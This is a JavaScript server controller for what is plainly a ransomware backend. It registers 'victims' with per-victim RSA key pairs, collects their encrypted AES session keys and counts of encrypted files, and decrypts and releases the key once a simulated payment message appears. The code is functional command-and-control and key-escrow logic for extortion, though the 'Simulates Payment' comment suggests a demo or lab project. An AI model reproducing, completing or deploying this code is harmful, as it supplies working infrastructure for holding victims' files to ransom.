import { randomUUID, generateKeyPairSync, privateDecrypt, constants } from 'crypto';
import db from '../config/db.js';

// Helper: Create Victim Identity with RSA Keys
export const createVictimIdentity = (ip) => {
    const clientId = randomUUID();
    console.log(`[Backend] Generating keys for: ${clientId}`);
    
    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    db.run(
        `INSERT OR IGNORE INTO victims (client_id, created_at, ip, private_key, public_key) VALUES (?, ?, ?, ?, ?)`,
        [clientId, new Date().toISOString(), ip, privateKey, publicKey]
    );
    return { clientId, publicKey, privateKey };
};

// Controller: New Victim Registration
export const newVictim = (req, res) => {
    const identity = createVictimIdentity(req.ip);
    res.status(201).json({ clientId: identity.clientId, publicKey: identity.publicKey });
};

export const reportSessionKey = (req, res) => {
    const { key, clientId, filesCount } = req.body;
    
    if (!key || !clientId) return res.status(400).json({ error: 'Missing data' });

    db.run(
        `INSERT INTO session_keys (client_id, key, files_count, received_at, ip) VALUES (?, ?, ?, ?, ?)`,
        [clientId, key, filesCount || 0, new Date().toISOString(), req.ip],
        (err) => {
            if (err) {
                console.error(err);
                return res.status(500).json({error: "DB Error"});
            }
            console.log(`[Backend] Key received for ${clientId}`);
            res.status(201).json({ stored: true });
        }
    );
};

// Controller: Recover Key (Simulates Payment & Key Retrieval)
export const recoverKey = (req, res) => {
    const { clientId } = req.body;
    if (!clientId) return res.status(400).json({ error: 'Missing Client ID' });

    // 1. Find the latest session key and the victim's private key
    const query = `
        SELECT s.key as encrypted_aes, v.private_key 
        FROM session_keys s
        JOIN victims v ON s.client_id = v.client_id
        WHERE s.client_id = ?
        ORDER BY s.id DESC LIMIT 1
    `;

    db.get(query, [clientId], (err, row) => {
        if (err) return res.status(500).json({ error: "Database error" });
        if (!row) return res.status(404).json({ error: "No record found. Did you finish encryption?" });

        try {
            // 2. Decrypt the AES key using the stored Private Key
            const privateKey = row.private_key;
            const encryptedBuffer = Buffer.from(row.encrypted_aes, 'base64');

            const rawAesKey = privateDecrypt(
                {
                    key: privateKey,
                    padding: constants.RSA_PKCS1_PADDING,
                },
                encryptedBuffer
            );

            console.log(`[Backend] Recovering keys for ${clientId}`);

            // 3. Send the RAW AES key back to the victim
            res.json({ 
                success: true, 
                key: rawAesKey.toString('base64'),
                message: "Payment confirmed. Key released."
            });

        } catch (e) {
            console.error("Decryption error:", e);
            res.status(500).json({ error: "Server failed to decrypt key." });
        }
    });
};